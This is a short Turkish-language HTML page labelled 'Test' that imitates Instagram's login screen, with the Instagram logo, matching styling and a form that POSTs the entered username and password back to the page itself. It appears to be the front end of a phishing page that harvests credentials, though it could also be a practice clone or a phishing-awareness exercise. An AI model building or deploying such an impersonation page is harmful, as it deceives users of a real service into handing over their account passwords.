<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>Instagram Giriş (Test)</title>
  <style>
    body {
      background-color: #fafafa;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .form-box {
      background-color: white;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 350px;
      text-align: center;
      border-radius: 10px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 5px 0;
      border: 1px solid #ccc;
      border-radius: 3px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #3897f0;
      color: white;
      border: none;
      margin-top: 10px;
      font-weight: bold;
      border-radius: 3px;
    }
  </style>
</head>
<body>
  <div class="form-box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" width="180" />
    <form method="POST">
      <input type="text" name="username" placeholder="Kullanıcı adı" required />
      <input type="password" name="password" placeholder="Şifre" required />
      <button type="submit">Giriş Yap</button>
    </form>
  </div>
</body>
</html>
